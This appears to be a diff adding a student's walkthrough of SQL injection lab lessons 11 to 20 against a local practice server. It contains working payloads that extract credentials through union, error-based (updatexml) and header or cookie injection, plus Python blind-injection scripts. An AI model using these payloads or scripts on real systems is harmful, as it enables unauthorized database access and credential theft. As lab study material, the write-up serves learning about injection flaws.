@@ -1,0 +1,364 @@
+less 11 - 
+
+In this challenge, they have given a password and username box.On monitoring network, you can see that whatever you type in these textboxes are sent as request headers
+to the backend.
+on typing random text, you will get message "login attempt failed".
+
+on typing correct login information(taken from other challenges), we can see our username and password for and a message saying successfully logged in.
+By putting a '\', we get the message 
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\' LIMIT 0,1' at line 1
+so we know we can use single quote to break the query
+
+since this is a login form, we can expect the sql query in the backend to look like -
+
+select username, password where username = '$_POST('uname')' and password = '$_POST('passwd')' LIMIT 0,1;
+
+hence we can ignore username while performing injection and use query like
+' union select (select database()),1 --'
+in password section
+
+we can use query -
+
+'union select (select group_concat(table_name) from information_schema.tables where table_schema = database()),1 --'
+
+to find all tables in database
+
+from the above data, we find the table of users to be called 'users'.
+now we can find username and password of all users in the table by using queries -
+
+
+'union select (select group_concat(username) from users),1 --'
+
+'union select (select group_concat(password) from users),1 --'
+
+separately in password box.
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 12 - 
+
+by putting '\' in username, we get error -
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"\") and password=("") LIMIT 0,1' at line 1
+hence we can find out that our input id being enclosed like ("$_POST[uname]") and ("$_POST[passwd]")
+
+hence we can use query like
+
+") union select (select database()),1 --("
+
+in password to get any information we want
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 13 -
+
+by putting '\' un username, we get error - 
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\') and password=('') LIMIT 0,1' at line 1
+
+hence we can find out that our input id being enclosed like ('$_POST[uname]') and ('$_POST[passwd]')
+
+hence we can use query like
+
+') union select (select database()),1 --('
+
+however this time we observe that no information is being returned directly. hence we'll have to use blind sql injection to get info
+So I wrote this python program to extract data using blind sqli - 
+
+
+================================================================
+import requests
+
+
+url="http://localhost:8001"
+lesson = "/Less-13/"
+
+url = url + lesson
+query = "(select database())"
+
+k = 0
+for i in range(100):
+    q1 = "') or length(" + query + ") = " + str(i) + " --('"
+    data = {'uname':'','passwd':q1}
+    r = requests.post(url,data)
+    if "flag.jpg" in r.text:
+        print(i)
+        k = i
+        break
+
+if k == 0:
+    print("length of response is greater than 100, make change to program")
+    exit()
+
+returnval = ""
+q2 = "') or binary substr(" + query + ","
+for i in range(1,k + 1):
+    for j in range(48,123):
+        q3 = q2 + str(i) + ",1)=('" + chr(j)
+        data = {'uname':'','passwd':q3}
+        r = requests.post(url,data)
+        if "flag.jpg" in r.text:
+            returnval += chr(j)
+#            print(q3)
+            break
+
+print(returnval)
+===============================================================
+
+on changing value of query in the program, we can get different data from the database
+
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 14 - 
+
+on putting '\' in username, we get error -
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"\" and password="" LIMIT 0,1' at line 1
+
+hence we see that the input is being enclosed in double quotes
+
+on trying a query - 
+" union select 1,2 --"
+
+we get message "successfully logged in" but no other details are given therefore we need to use blind sqli so we can rewrite above program 
+
+===============================================================
+import requests
+
+
+url="http://localhost:8001"
+lesson = "/Less-14/"
+
+url = url + lesson
+query = "(select group_concat(engine) from information_schema.tables where table_schema = database())"
+
+k = 0
+for i in range(100):
+    q1 = '" or length(' + query + ') = ' + str(i) + ' --"'
+    data = {'uname':'','passwd':q1}
+    r = requests.post(url,data)
+    if "flag.jpg" in r.text:
+        print(i)
+        k = i
+        break
+
+if k == 0:
+    print("length of response is greater than 100, make change to program")
+    exit()
+
+returnval = ""
+q2 = '"' + " or binary substr(" + query + ","
+for i in range(1,k + 1):
+    for j in range(48,123):
+        q3 = q2 + str(i) + ",1)=" + '"' + chr(j)
+        data = {'uname':'','passwd':q3}
+        r = requests.post(url,data)
+        if "flag.jpg" in r.text:
+            returnval += chr(j)
+#            print(q3)
+            break
+
+print(returnval)
+===============================================================
+
+using above program, we can retrieve data about database storage system
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 15 -
+
+if we try putting '\' in username, it doesn't show the error therefore, we cannot easily get the internally used query
+Therefore, we have to try guessing on how to break the query.
+
+on trying the query 
+' union select 1,'1
+in password section, we get message saying "successfully logged in"
+so this must mean that we successfully guessed how to break the query.
+now we can use this in the previously made program to get all the data using blind sql injection(since no extra details get displayed on the page)
+
+===============================================================
+import requests
+
+
+url="http://localhost:8001"
+lesson = "/Less-15/"
+
+url = url + lesson
+query = "(select current_user())"
+
+k = 0
+for i in range(100):
+    q1 = "' or length(" + query + ") = " + str(i) + " --'"
+    data = {'uname':'','passwd':q1}
+    r = requests.post(url,data)
+    if "flag.jpg" in r.text:
+        print(i)
+        k = i
+        break
+
+if k == 0:
+    print("length of response is greater than 100, make change to program")
+    exit()
+
+returnval = ""
+q2 = "' or binary substr(" + query + ","
+for i in range(1,k + 1):
+    for j in range(48,123):
+        q3 = q2 + str(i) + ",1)='" + chr(j)
+        data = {'uname':'','passwd':q3}
+        r = requests.post(url,data)
+        if "flag.jpg" in r.text:
+            returnval += chr(j)
+#            print(q3)
+            break
+
+print(returnval)
+===============================================================
+
+we can use this program to get user of the table
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 16 -
+
+this is very similar to less 15, except that the input is enclosed in '("' and not in single quotes. This is found out by experimenting since error messages aren't displayed.
+
+ hence we can make the program
+
+===============================================================
+import requests
+
+
+url="http://localhost:8001"
+lesson = "/Less-16/"
+
+url = url + lesson
+query = "(select group_concat(column_name) from information_schema.columns where table_name='users')"
+
+k = 0
+for i in range(1000):
+    q1 = '")' + " or length(" + query + ") = " + '("' + str(i)
+    data = {'uname':'','passwd':q1}
+    r = requests.post(url,data)
+    if "flag.jpg" in r.text:
+        print(i)
+        k = i
+        break
+
+if k == 0:
+    print("length of response is greater than 1000, make change to program")
+    exit()
+
+returnval = ""
+q2 = '")' + " or binary substr(" + query + ","
+for i in range(1,k + 1):
+    for j in range(48,123):
+        q3 = q2 + str(i) + ",1)=" + '("' + chr(j)
+        data = {'uname':'','passwd':q3}
+        r = requests.post(url,data)
+        if "flag.jpg" in r.text:
+            returnval += chr(j)
+#            print(q3)
+            break
+
+print(returnval)
+
+===============================================================
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 17 - 
+
+in this lesson, the records are being updated. so my guess on the sql statement being used is -
+UPDATE users SET password = $_POST[passwd] WHERE username = $_POST[username]
+
+if you try entering details only to username or password field, you get the message "bug off you silly dumb hacker"
+if the username doesn't exist also you'll get the same message.
+
+we can inject sql query into this query by first giving a valid username(i.e. Dumb) and commenting out the rest of the statement using the password field
+so I tried using the query -
+'if(1=1, sleep(10),null) --'
+in password field but got the error
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'if(1=1, sleep(10),null) --'' WHERE username='Dumb'' at line 1
+ with this error, we can find out that the input is enclosed in single quotes
+
+after trying lot of different things with time-based sql injection, I couldn't figure out how to successfully use if() along with sleep() to extract data from the database
+Then I came across updatexml() query.
+
+This is useful for when the error is displayed on screen. It can be used like - 
+
+' or updatexml(null,concat(0x3a3a,database()),null) #
+
+in the password field while giving the username field a valid input.
+
+with this, we can find out the database name.
+
+' or updatexml(null,concat(0x3a3a,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),null) # 
+
+with above query, we can find all tables in database
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 18 - 
+
+the title of the lesson says header injection. By this, we can guess that in this lessson, we're only supposed to play around with the headers.
+if we try random inputs into the username or password field, we do not get any output other than login attempt failed.
+However, on giving a valid input i.e. - admin for username and admin for password (based on data we have seen from previous injections), it shows our user agent.
+It also shows our IP address. however we cannot change our ip address easily.
+Therefore, my guess is that we need to change the user agent in the request headers.
+
+on putting '\'' in the user agent header, we get error -
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\','172.17.0.1', 'admin')' at line 1
+
+this syntax looks familiar to sql insert query
+
+i.e.
+insert into uagents values(user-agent,ip,admin)
+
+however it looks like the user-agent doesn't get enclosed in quotes or anything.
+therefore we can use error based sql injection using updatexml() to do the job.
+
+i.e. -
+' or updatexml(null,concat(0x3a3a,database()),null) or '1
+above query being placed in the user-agent header returns the database name in an xpath error.
+' or updatexml(null,concat(0x3a3a,current_user()),null) or '1
+above query returns current user in an xpath error
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 19 - 
+
+This one also has same title as that of previous lesson. however, on giving random valid input, we see that the referer is being displayed this time.
+Hence we can make a guess that we need to change the referer to make injections.
+on changing referer to '\, we get the error message -
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\', '172.17.0.1')' at line 1
+hence we see that the referrer must be going into an insert into statement.
+
+we can again use same updatexml() query to get the required output in the error messages.
+
+' or updatexml(null,concat(0x3a3a,(select group_concat(column_name) from information_schema.columns where table_name = referers)),null) or '1
+
+from above query, we can find the columns of referers table.
+
+-------------------------------------------------------------------------------------------------------------------------
+
+less 20 -
+
+on giving valid credentials, it displays all the request headers and creates a cookie "uname" with the value "admin"(which is the username I logged in with)
+on giving invalid credentials, it says login attempt failed.
+
+when it gets submitted, I tried changing the cookie to - '\ and got the error -
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' LIMIT 0,1' at line 1
+hence I think it must be a select statement with the cookie being a parameter in it.
+on using a union statement - "' union select '1" in the cookie, I get the error
+The used SELECT statements have a different number of columns
+which confirms my guess that it is a select statement.
+
+on using the query 
+
+' union select 1,2,3 #
+
+in the cookie, the webpage returns the login name as 2, password as 3 and id as 1.
+therefore, the query used might be like
+
+select id,username,password from users where username = '$_COOKIE[uname]' limit 0,1
+
+therefore we can easily break the query by changing the cookie using single quotes.
